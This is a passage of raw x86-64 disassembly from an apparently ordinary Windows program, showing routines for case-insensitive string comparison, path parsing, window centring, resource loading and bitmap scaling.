   14000416e:	5d                   	pop    %rbp
   14000416f:	c3                   	ret
   140004170:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004175:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000417a:	55                   	push   %rbp
   14000417b:	48 8b ec             	mov    %rsp,%rbp
   14000417e:	48 83 ec 40          	sub    $0x40,%rsp
   140004182:	48 8b f9             	mov    %rcx,%rdi
   140004185:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004189:	48 8b da             	mov    %rdx,%rbx
   14000418c:	e8 c7 52 01 00       	call   0x140019458
   140004191:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004195:	48 8b d3             	mov    %rbx,%rdx
   140004198:	e8 1b 54 01 00       	call   0x1400195b8
   14000419d:	48 8d 15 08 21 02 00 	lea    0x22108(%rip),%rdx        # 0x1400262ac
   1400041a4:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400041a8:	e8 8f 54 01 00       	call   0x14001963c
   1400041ad:	48 8d 15 3c 21 02 00 	lea    0x2213c(%rip),%rdx        # 0x1400262f0
   1400041b4:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400041b8:	e8 d3 52 01 00       	call   0x140019490
   1400041bd:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400041c1:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400041c5:	48 8b cf             	mov    %rdi,%rcx
   1400041c8:	e8 57 58 01 00       	call   0x140019a24
   1400041cd:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400041d1:	e8 98 fb 01 00       	call   0x140023d6e
   1400041d6:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400041da:	48 8b d3             	mov    %rbx,%rdx
   1400041dd:	e8 d6 53 01 00       	call   0x1400195b8
   1400041e2:	48 8d 15 b3 20 02 00 	lea    0x220b3(%rip),%rdx        # 0x14002629c
   1400041e9:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400041ed:	e8 4a 54 01 00       	call   0x14001963c
   1400041f2:	48 8d 15 e7 20 02 00 	lea    0x220e7(%rip),%rdx        # 0x1400262e0
   1400041f9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400041fd:	e8 8e 52 01 00       	call   0x140019490
   140004202:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140004206:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000420a:	48 8b cf             	mov    %rdi,%rcx
   14000420d:	e8 12 58 01 00       	call   0x140019a24
   140004212:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140004216:	e8 53 fb 01 00       	call   0x140023d6e
   14000421b:	48 8d 15 b6 20 02 00 	lea    0x220b6(%rip),%rdx        # 0x1400262d8
   140004222:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004226:	e8 65 52 01 00       	call   0x140019490
   14000422b:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000422f:	4c 8b c3             	mov    %rbx,%r8
   140004232:	48 8b cf             	mov    %rdi,%rcx
   140004235:	e8 ea 57 01 00       	call   0x140019a24
   14000423a:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   14000423e:	e8 2b fb 01 00       	call   0x140023d6e
   140004243:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140004247:	e8 22 fb 01 00       	call   0x140023d6e
   14000424c:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004251:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004256:	48 83 c4 40          	add    $0x40,%rsp
   14000425a:	5d                   	pop    %rbp
   14000425b:	c3                   	ret
   14000425c:	40 53                	rex push %rbx
   14000425e:	48 83 ec 30          	sub    $0x30,%rsp
   140004262:	48 8b d9             	mov    %rcx,%rbx
   140004265:	48 8d 15 94 20 02 00 	lea    0x22094(%rip),%rdx        # 0x140026300
   14000426c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004271:	e8 1a 52 01 00       	call   0x140019490
   140004276:	4c 8d 05 23 8a 02 00 	lea    0x28a23(%rip),%r8        # 0x14002cca0
   14000427d:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004282:	48 8b cb             	mov    %rbx,%rcx
   140004285:	e8 9a 57 01 00       	call   0x140019a24
   14000428a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000428f:	e8 da fa 01 00       	call   0x140023d6e
   140004294:	48 83 c4 30          	add    $0x30,%rsp
   140004298:	5b                   	pop    %rbx
   140004299:	c3                   	ret
   14000429a:	cc                   	int3
   14000429b:	cc                   	int3
   14000429c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400042a1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400042a6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400042ab:	57                   	push   %rdi
   1400042ac:	41 54                	push   %r12
   1400042ae:	41 55                	push   %r13
   1400042b0:	41 56                	push   %r14
   1400042b2:	41 57                	push   %r15
   1400042b4:	48 83 ec 20          	sub    $0x20,%rsp
   1400042b8:	33 ff                	xor    %edi,%edi
   1400042ba:	45 8b e0             	mov    %r8d,%r12d
   1400042bd:	4c 8b f2             	mov    %rdx,%r14
   1400042c0:	4c 8b f9             	mov    %rcx,%r15
   1400042c3:	8b f7                	mov    %edi,%esi
   1400042c5:	45 85 c0             	test   %r8d,%r8d
   1400042c8:	7e 73                	jle    0x14000433d
   1400042ca:	4c 8b e9             	mov    %rcx,%r13
   1400042cd:	48 8b ea             	mov    %rdx,%rbp
   1400042d0:	4c 2b ea             	sub    %rdx,%r13
   1400042d3:	41 0f b7 5c 2d 00    	movzwl 0x0(%r13,%rbp,1),%ebx
   1400042d9:	66 85 db             	test   %bx,%bx
   1400042dc:	74 5f                	je     0x14000433d
   1400042de:	66 39 7d 00          	cmp    %di,0x0(%rbp)
   1400042e2:	74 59                	je     0x14000433d
   1400042e4:	66 83 fb 61          	cmp    $0x61,%bx
   1400042e8:	72 1e                	jb     0x140004308
   1400042ea:	66 83 fb 7a          	cmp    $0x7a,%bx
   1400042ee:	77 06                	ja     0x1400042f6
   1400042f0:	66 83 eb 20          	sub    $0x20,%bx
   1400042f4:	eb 12                	jmp    0x140004308
   1400042f6:	66 83 fb 7f          	cmp    $0x7f,%bx
   1400042fa:	76 0c                	jbe    0x140004308
   1400042fc:	0f b7 cb             	movzwl %bx,%ecx
   1400042ff:	ff 15 eb 12 02 00    	call   *0x212eb(%rip)        # 0x1400255f0
   140004305:	48 8b d8             	mov    %rax,%rbx
   140004308:	0f b7 45 00          	movzwl 0x0(%rbp),%eax
   14000430c:	66 83 f8 61          	cmp    $0x61,%ax
   140004310:	72 1b                	jb     0x14000432d
   140004312:	66 83 f8 7a          	cmp    $0x7a,%ax
   140004316:	77 06                	ja     0x14000431e
   140004318:	66 83 e8 20          	sub    $0x20,%ax
   14000431c:	eb 0f                	jmp    0x14000432d
   14000431e:	66 83 f8 7f          	cmp    $0x7f,%ax
   140004322:	76 09                	jbe    0x14000432d
   140004324:	0f b7 c8             	movzwl %ax,%ecx
   140004327:	ff 15 c3 12 02 00    	call   *0x212c3(%rip)        # 0x1400255f0
   14000432d:	66 3b d8             	cmp    %ax,%bx
   140004330:	75 31                	jne    0x140004363
   140004332:	ff c6                	inc    %esi
   140004334:	48 83 c5 02          	add    $0x2,%rbp
   140004338:	41 3b f4             	cmp    %r12d,%esi
   14000433b:	7c 96                	jl     0x1400042d3
   14000433d:	41 3b f4             	cmp    %r12d,%esi
   140004340:	40 0f 95 c7          	setne  %dil
   140004344:	8b c7                	mov    %edi,%eax
   140004346:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000434b:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140004350:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140004355:	48 83 c4 20          	add    $0x20,%rsp
   140004359:	41 5f                	pop    %r15
   14000435b:	41 5e                	pop    %r14
   14000435d:	41 5d                	pop    %r13
   14000435f:	41 5c                	pop    %r12
   140004361:	5f                   	pop    %rdi
   140004362:	c3                   	ret
   140004363:	48 63 fe             	movslq %esi,%rdi
   140004366:	41 0f b7 1c 7f       	movzwl (%r15,%rdi,2),%ebx
   14000436b:	66 83 fb 61          	cmp    $0x61,%bx
   14000436f:	72 1e                	jb     0x14000438f
   140004371:	66 83 fb 7a          	cmp    $0x7a,%bx
   140004375:	77 06                	ja     0x14000437d
   140004377:	66 83 eb 20          	sub    $0x20,%bx
   14000437b:	eb 12                	jmp    0x14000438f
   14000437d:	66 83 fb 7f          	cmp    $0x7f,%bx
   140004381:	76 0c                	jbe    0x14000438f
   140004383:	0f b7 cb             	movzwl %bx,%ecx
   140004386:	ff 15 64 12 02 00    	call   *0x21264(%rip)        # 0x1400255f0
   14000438c:	48 8b d8             	mov    %rax,%rbx
   14000438f:	41 0f b7 04 7e       	movzwl (%r14,%rdi,2),%eax
   140004394:	66 83 f8 61          	cmp    $0x61,%ax
   140004398:	72 1b                	jb     0x1400043b5
   14000439a:	66 83 f8 7a          	cmp    $0x7a,%ax
   14000439e:	77 06                	ja     0x1400043a6
   1400043a0:	66 83 e8 20          	sub    $0x20,%ax
   1400043a4:	eb 0f                	jmp    0x1400043b5
   1400043a6:	66 83 f8 7f          	cmp    $0x7f,%ax
   1400043aa:	76 09                	jbe    0x1400043b5
   1400043ac:	0f b7 c8             	movzwl %ax,%ecx
   1400043af:	ff 15 3b 12 02 00    	call   *0x2123b(%rip)        # 0x1400255f0
   1400043b5:	0f b7 c8             	movzwl %ax,%ecx
   1400043b8:	0f b7 c3             	movzwl %bx,%eax
   1400043bb:	2b c1                	sub    %ecx,%eax
   1400043bd:	eb 87                	jmp    0x140004346
   1400043bf:	cc                   	int3
   1400043c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400043c5:	57                   	push   %rdi
   1400043c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400043ca:	ba 5c 00 00 00       	mov    $0x5c,%edx
   1400043cf:	48 8b d9             	mov    %rcx,%rbx
   1400043d2:	e8 79 54 01 00       	call   0x140019850
   1400043d7:	ba 2f 00 00 00       	mov    $0x2f,%edx
   1400043dc:	48 8b cb             	mov    %rbx,%rcx
   1400043df:	8b f8                	mov    %eax,%edi
   1400043e1:	e8 6a 54 01 00       	call   0x140019850
   1400043e6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400043eb:	3b c7                	cmp    %edi,%eax
   1400043ed:	0f 4f f8             	cmovg  %eax,%edi
   1400043f0:	8b c7                	mov    %edi,%eax
   1400043f2:	48 83 c4 20          	add    $0x20,%rsp
   1400043f6:	5f                   	pop    %rdi
   1400043f7:	c3                   	ret
   1400043f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400043fd:	57                   	push   %rdi
   1400043fe:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140004405:	33 c9                	xor    %ecx,%ecx
   140004407:	ff 15 4b 0e 02 00    	call   *0x20e4b(%rip)        # 0x140025258
   14000440d:	33 ff                	xor    %edi,%edi
   14000440f:	4c 8d 05 1a 1f 02 00 	lea    0x21f1a(%rip),%r8        # 0x140026330
   140004416:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   14000441b:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140004420:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   140004425:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   14000442a:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   14000442e:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   140004432:	48 8d 15 cf 1e 02 00 	lea    0x21ecf(%rip),%rdx        # 0x140026308
   140004439:	45 33 c9             	xor    %r9d,%r9d
   14000443c:	b9 80 00 00 00       	mov    $0x80,%ecx
   140004441:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140004445:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140004449:	ff 15 19 11 02 00    	call   *0x21119(%rip)        # 0x140025568
   14000444f:	48 8b d8             	mov    %rax,%rbx
   140004452:	ff 15 18 11 02 00    	call   *0x21118(%rip)        # 0x140025570
   140004458:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000445d:	48 8b c8             	mov    %rax,%rcx
   140004460:	ff 15 12 11 02 00    	call   *0x21112(%rip)        # 0x140025578
   140004466:	8b 44 24 6c          	mov    0x6c(%rsp),%eax
   14000446a:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   140004471:	00 
   140004472:	2b 44 24 64          	sub    0x64(%rsp),%eax
   140004476:	48 8b cb             	mov    %rbx,%rcx
   140004479:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000447d:	99                   	cltd
   14000447e:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140004482:	2b c2                	sub    %edx,%eax
   140004484:	d1 f8                	sar    $1,%eax
   140004486:	44 8b c8             	mov    %eax,%r9d
   140004489:	8b 44 24 68          	mov    0x68(%rsp),%eax
   14000448d:	2b 44 24 60          	sub    0x60(%rsp),%eax
   140004491:	99                   	cltd
   140004492:	2b c2                	sub    %edx,%eax
   140004494:	33 d2                	xor    %edx,%edx
   140004496:	d1 f8                	sar    $1,%eax
   140004498:	44 8b c0             	mov    %eax,%r8d
   14000449b:	ff 15 df 10 02 00    	call   *0x210df(%rip)        # 0x140025580
   1400044a1:	48 85 db             	test   %rbx,%rbx
   1400044a4:	74 45                	je     0x1400044eb
   1400044a6:	45 33 c9             	xor    %r9d,%r9d
   1400044a9:	48 8b cb             	mov    %rbx,%rcx
   1400044ac:	41 8d 79 01          	lea    0x1(%r9),%edi
   1400044b0:	44 8b c7             	mov    %edi,%r8d
   1400044b3:	8b d7                	mov    %edi,%edx
   1400044b5:	ff 15 ed 10 02 00    	call   *0x210ed(%rip)        # 0x1400255a8
   1400044bb:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400044c0:	45 33 c9             	xor    %r9d,%r9d
   1400044c3:	45 33 c0             	xor    %r8d,%r8d
   1400044c6:	33 d2                	xor    %edx,%edx
   1400044c8:	ff 15 c2 10 02 00    	call   *0x210c2(%rip)        # 0x140025590
   1400044ce:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400044d3:	ff 15 bf 10 02 00    	call   *0x210bf(%rip)        # 0x140025598
   1400044d9:	8b d7                	mov    %edi,%edx
   1400044db:	48 8b cb             	mov    %rbx,%rcx
   1400044de:	ff 15 bc 10 02 00    	call   *0x210bc(%rip)        # 0x1400255a0
   1400044e4:	48 89 1d f5 85 02 00 	mov    %rbx,0x285f5(%rip)        # 0x14002cae0
   1400044eb:	48 8b 9c 24 b0 00 00 	mov    0xb0(%rsp),%rbx
   1400044f2:	00 
   1400044f3:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   1400044fa:	5f                   	pop    %rdi
   1400044fb:	c3                   	ret
   1400044fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004501:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004506:	57                   	push   %rdi
   140004507:	48 83 ec 20          	sub    $0x20,%rsp
   14000450b:	48 8b f2             	mov    %rdx,%rsi
   14000450e:	48 8b f9             	mov    %rcx,%rdi
   140004511:	ff 15 41 10 02 00    	call   *0x21041(%rip)        # 0x140025558
   140004517:	48 8b d8             	mov    %rax,%rbx
   14000451a:	48 85 c0             	test   %rax,%rax
   14000451d:	74 2a                	je     0x140004549
   14000451f:	48 8b d6             	mov    %rsi,%rdx
   140004522:	48 8b cf             	mov    %rdi,%rcx
   140004525:	ff 15 4d 10 02 00    	call   *0x2104d(%rip)        # 0x140025578
   14000452b:	48 8b d6             	mov    %rsi,%rdx
   14000452e:	48 8b cb             	mov    %rbx,%rcx
   140004531:	ff 15 29 10 02 00    	call   *0x21029(%rip)        # 0x140025560
   140004537:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   14000453b:	48 8b cb             	mov    %rbx,%rcx
   14000453e:	ff 15 1c 10 02 00    	call   *0x2101c(%rip)        # 0x140025560
   140004544:	b8 01 00 00 00       	mov    $0x1,%eax
   140004549:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000454e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004553:	48 83 c4 20          	add    $0x20,%rsp
   140004557:	5f                   	pop    %rdi
   140004558:	c3                   	ret
   140004559:	cc                   	int3
   14000455a:	cc                   	int3
   14000455b:	cc                   	int3
   14000455c:	48 8b c4             	mov    %rsp,%rax
   14000455f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004563:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004567:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000456b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000456f:	41 54                	push   %r12
   140004571:	48 83 ec 70          	sub    $0x70,%rsp
   140004575:	4c 8b e1             	mov    %rcx,%r12
   140004578:	33 c9                	xor    %ecx,%ecx
   14000457a:	49 8b f0             	mov    %r8,%rsi
   14000457d:	48 8b ea             	mov    %rdx,%rbp
   140004580:	ff 15 d2 0c 02 00    	call   *0x20cd2(%rip)        # 0x140025258
   140004586:	44 0f b7 0d 5a 85 02 	movzwl 0x2855a(%rip),%r9d        # 0x14002cae8
   14000458d:	00 
   14000458e:	4c 8b c5             	mov    %rbp,%r8
   140004591:	49 8b d4             	mov    %r12,%rdx
   140004594:	48 8b c8             	mov    %rax,%rcx
   140004597:	48 8b f8             	mov    %rax,%rdi
   14000459a:	ff 15 90 0c 02 00    	call   *0x20c90(%rip)        # 0x140025230
   1400045a0:	48 8b d8             	mov    %rax,%rbx
   1400045a3:	48 85 c0             	test   %rax,%rax
   1400045a6:	75 1d                	jne    0x1400045c5
   1400045a8:	41 b9 09 04 00 00    	mov    $0x409,%r9d
   1400045ae:	4c 8b c5             	mov    %rbp,%r8
   1400045b1:	49 8b d4             	mov    %r12,%rdx
   1400045b4:	48 8b cf             	mov    %rdi,%rcx
   1400045b7:	ff 15 73 0c 02 00    	call   *0x20c73(%rip)        # 0x140025230
   1400045bd:	48 8b d8             	mov    %rax,%rbx
   1400045c0:	48 85 c0             	test   %rax,%rax
   1400045c3:	74 36                	je     0x1400045fb
   1400045c5:	48 85 f6             	test   %rsi,%rsi
   1400045c8:	74 12                	je     0x1400045dc
   1400045ca:	48 8b d3             	mov    %rbx,%rdx
   1400045cd:	48 8b cf             	mov    %rdi,%rcx
   1400045d0:	ff 15 62 0c 02 00    	call   *0x20c62(%rip)        # 0x140025238
   1400045d6:	44 8b d8             	mov    %eax,%r11d
   1400045d9:	4c 89 1e             	mov    %r11,(%rsi)
   1400045dc:	48 8b d3             	mov    %rbx,%rdx
   1400045df:	48 8b cf             	mov    %rdi,%rcx
   1400045e2:	ff 15 58 0c 02 00    	call   *0x20c58(%rip)        # 0x140025240
   1400045e8:	48 85 c0             	test   %rax,%rax
   1400045eb:	74 0e                	je     0x1400045fb
   1400045ed:	48 8b c8             	mov    %rax,%rcx
   1400045f0:	ff 15 52 0c 02 00    	call   *0x20c52(%rip)        # 0x140025248
   1400045f6:	e9 86 00 00 00       	jmp    0x140004681
   1400045fb:	83 3d ea 84 02 00 00 	cmpl   $0x0,0x284ea(%rip)        # 0x14002caec
   140004602:	75 7b                	jne    0x14000467f
   140004604:	48 8b 0d 2d 85 02 00 	mov    0x2852d(%rip),%rcx        # 0x14002cb38
   14000460b:	48 8d 15 66 1d 02 00 	lea    0x21d66(%rip),%rdx        # 0x140026378
   140004612:	c7 05 d0 84 02 00 01 	movl   $0x1,0x284d0(%rip)        # 0x14002caec
   140004619:	00 00 00 
   14000461c:	ff 15 2e 0c 02 00    	call   *0x20c2e(%rip)        # 0x140025250
   140004622:	44 0f b7 05 be 84 02 	movzwl 0x284be(%rip),%r8d        # 0x14002cae8
   140004629:	00 
   14000462a:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140004630:	48 8d 15 21 1d 02 00 	lea    0x21d21(%rip),%rdx        # 0x140026358
   140004637:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000463c:	45 33 c9             	xor    %r9d,%r9d
   14000463f:	48 8b d8             	mov    %rax,%rbx
   140004642:	c7 44 24 20 09 04 00 	movl   $0x409,0x20(%rsp)
   140004649:	00 
   14000464a:	ff 15 78 0f 02 00    	call   *0x20f78(%rip)        # 0x1400255c8
   140004650:	48 85 db             	test   %rbx,%rbx
   140004653:	75 1c                	jne    0x140004671
   140004655:	48 8b 0d dc 84 02 00 	mov    0x284dc(%rip),%rcx        # 0x14002cb38
   14000465c:	48 8d 15 d5 1c 02 00 	lea    0x21cd5(%rip),%rdx        # 0x140026338
   140004663:	ff 15 e7 0b 02 00    	call   *0x20be7(%rip)        # 0x140025250
   140004669:	48 8b d8             	mov    %rax,%rbx
   14000466c:	48 85 c0             	test   %rax,%rax
   14000466f:	74 0e                	je     0x14000467f
   140004671:	45 33 c0             	xor    %r8d,%r8d
   140004674:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004679:	41 8d 48 04          	lea    0x4(%r8),%ecx
   14000467d:	ff d3                	call   *%rbx
   14000467f:	33 c0                	xor    %eax,%eax
   140004681:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004686:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000468a:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000468e:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140004692:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140004696:	49 8b e3             	mov    %r11,%rsp
   140004699:	41 5c                	pop    %r12
   14000469b:	c3                   	ret
   14000469c:	48 8b c4             	mov    %rsp,%rax
   14000469f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400046a3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400046a7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400046ab:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400046af:	41 54                	push   %r12
   1400046b1:	41 55                	push   %r13
   1400046b3:	41 56                	push   %r14
   1400046b5:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400046bc:	48 8b f1             	mov    %rcx,%rsi
   1400046bf:	33 c9                	xor    %ecx,%ecx
   1400046c1:	ff 15 79 0e 02 00    	call   *0x20e79(%rip)        # 0x140025540
   1400046c7:	ba 58 00 00 00       	mov    $0x58,%edx
   1400046cc:	48 8b c8             	mov    %rax,%rcx
   1400046cf:	4c 8b f0             	mov    %rax,%r14
   1400046d2:	ff 15 88 09 02 00    	call   *0x20988(%rip)        # 0x140025060
   1400046d8:	41 b8 60 00 00 00    	mov    $0x60,%r8d
   1400046de:	83 f8 01             	cmp    $0x1,%eax
   1400046e1:	41 8d 50 04          	lea    0x4(%r8),%edx
   1400046e5:	41 0f 4c c0          	cmovl  %r8d,%eax
   1400046e9:	8b c8                	mov    %eax,%ecx
   1400046eb:	ff 15 37 0b 02 00    	call   *0x20b37(%rip)        # 0x140025228
   1400046f1:	83 f8 76             	cmp    $0x76,%eax
   1400046f4:	7c 11                	jl     0x140004707
   1400046f6:	3d 91 00 00 00       	cmp    $0x91,%eax
   1400046fb:	7f 15                	jg     0x140004712
   1400046fd:	bf 04 00 00 00       	mov    $0x4,%edi
   140004702:	8d 5f ff             	lea    -0x1(%rdi),%ebx
   140004705:	eb 13                	jmp    0x14000471a
   140004707:	3d 91 00 00 00       	cmp    $0x91,%eax
   14000470c:	0f 8e 16 01 00 00    	jle    0x140004828
   140004712:	bf 03 00 00 00       	mov    $0x3,%edi
   140004717:	8d 5f ff             	lea    -0x1(%rdi),%ebx
   14000471a:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   14000471f:	ba 20 00 00 00       	mov    $0x20,%edx
   140004724:	48 8b ce             	mov    %rsi,%rcx
   140004727:	ff 15 53 09 02 00    	call   *0x20953(%rip)        # 0x140025080
   14000472d:	8b 4c 24 64          	mov    0x64(%rsp),%ecx
   140004731:	44 8b c3             	mov    %ebx,%r8d
   140004734:	8b d7                	mov    %edi,%edx
   140004736:	ff 15 ec 0a 02 00    	call   *0x20aec(%rip)        # 0x140025228
   14000473c:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   140004740:	44 8b c3             	mov    %ebx,%r8d
   140004743:	8b d7                	mov    %edi,%edx
   140004745:	8b e8                	mov    %eax,%ebp
   140004747:	ff 15 db 0a 02 00    	call   *0x20adb(%rip)        # 0x140025228
   14000474d:	49 8b ce             	mov    %r14,%rcx
   140004750:	8b d8                	mov    %eax,%ebx
   140004752:	ff 15 d8 08 02 00    	call   *0x208d8(%rip)        # 0x140025030
   140004758:	49 8b ce             	mov    %r14,%rcx
   14000475b:	4c 8b e8             	mov    %rax,%r13
   14000475e:	ff 15 cc 08 02 00    	call   *0x208cc(%rip)        # 0x140025030
   140004764:	48 8b d6             	mov    %rsi,%rdx
   140004767:	49 8b cd             	mov    %r13,%rcx
   14000476a:	4c 8b e0             	mov    %rax,%r12
   14000476d:	ff 15 fd 08 02 00    	call   *0x208fd(%rip)        # 0x140025070
   140004773:	44 8b c3             	mov    %ebx,%r8d
   140004776:	8b d5                	mov    %ebp,%edx
   140004778:	49 8b ce             	mov    %r14,%rcx
   14000477b:	48 8b f0             	mov    %rax,%rsi
   14000477e:	ff 15 e4 08 02 00    	call   *0x208e4(%rip)        # 0x140025068
   140004784:	49 8b cc             	mov    %r12,%rcx
   140004787:	48 8b d0             	mov    %rax,%rdx
   14000478a:	ff 15 e0 08 02 00    	call   *0x208e0(%rip)        # 0x140025070
   140004790:	ba 04 00 00 00       	mov    $0x4,%edx
   140004795:	49 8b cc             	mov    %r12,%rcx
   140004798:	48 8b f8             	mov    %rax,%rdi
   14000479b:	ff 15 d7 08 02 00    	call   *0x208d7(%rip)        # 0x140025078
   1400047a1:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   1400047a5:	c7 44 24 50 20 00 cc 	movl   $0xcc0020,0x50(%rsp)
   1400047ac:	00 
   1400047ad:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   1400047b1:	8b 4c 24 64          	mov    0x64(%rsp),%ecx
   1400047b5:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   1400047b9:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   1400047be:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   1400047c3:	44 8b cd             	mov    %ebp,%r9d
   1400047c6:	45 33 c0             	xor    %r8d,%r8d
   1400047c9:	33 d2                	xor    %edx,%edx
   1400047cb:	49 8b cc             	mov    %r12,%rcx
   1400047ce:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   1400047d3:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400047d7:	ff 15 7b 08 02 00    	call   *0x2087b(%rip)        # 0x140025058
   1400047dd:	ba 07 00 00 00       	mov    $0x7,%edx
   1400047e2:	49 8b cc             	mov    %r12,%rcx
   1400047e5:	ff 15 65 08 02 00    	call   *0x20865(%rip)        # 0x140025050
   1400047eb:	48 8b d6             	mov    %rsi,%rdx
   1400047ee:	49 8b cd             	mov    %r13,%rcx
   1400047f1:	48 8b d8             	mov    %rax,%rbx
   1400047f4:	ff 15 76 08 02 00    	call   *0x20876(%rip)        # 0x140025070
   1400047fa:	48 8b d7             	mov    %rdi,%rdx
   1400047fd:	49 8b cc             	mov    %r12,%rcx
   140004800:	ff 15 6a 08 02 00    	call   *0x2086a(%rip)        # 0x140025070
   140004806:	49 8b cd             	mov    %r13,%rcx
   140004809:	ff 15 39 08 02 00    	call   *0x20839(%rip)        # 0x140025048
   14000480f:	49 8b cc             	mov    %r12,%rcx
   140004812:	ff 15 30 08 02 00    	call   *0x20830(%rip)        # 0x140025048
   140004818:	49 8b d6             	mov    %r14,%rdx
   14000481b:	33 c9                	xor    %ecx,%ecx
   14000481d:	ff 15 25 0d 02 00    	call   *0x20d25(%rip)        # 0x140025548
   140004823:	48 8b c3             	mov    %rbx,%rax
   140004826:	eb 21                	jmp    0x140004849
   140004828:	49 8b d6             	mov    %r14,%rdx
   14000482b:	33 c9                	xor    %ecx,%ecx
   14000482d:	ff 15 15 0d 02 00    	call   *0x20d15(%rip)        # 0x140025548
   140004833:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140004838:	45 33 c9             	xor    %r9d,%r9d
   14000483b:	45 33 c0             	xor    %r8d,%r8d
   14000483e:	33 d2                	xor    %edx,%edx
   140004840:	48 8b ce             	mov    %rsi,%rcx
   140004843:	ff 15 07 0d 02 00    	call   *0x20d07(%rip)        # 0x140025550
   140004849:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140004850:	00 
   140004851:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140004855:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   140004859:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000485d:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140004861:	49 8b e3             	mov    %r11,%rsp
   140004864:	41 5e                	pop    %r14
   140004866:	41 5d                	pop    %r13
   140004868:	41 5c                	pop    %r12
   14000486a:	c3                   	ret
   14000486b:	cc                   	int3
   14000486c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004871:	55                   	push   %rbp
   140004872:	56                   	push   %rsi
   140004873:	41 54                	push   %r12
   140004875:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   14000487a:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140004881:	bb 40 00 00 00       	mov    $0x40,%ebx
   140004886:	48 8d 55 07          	lea    0x7(%rbp),%rdx
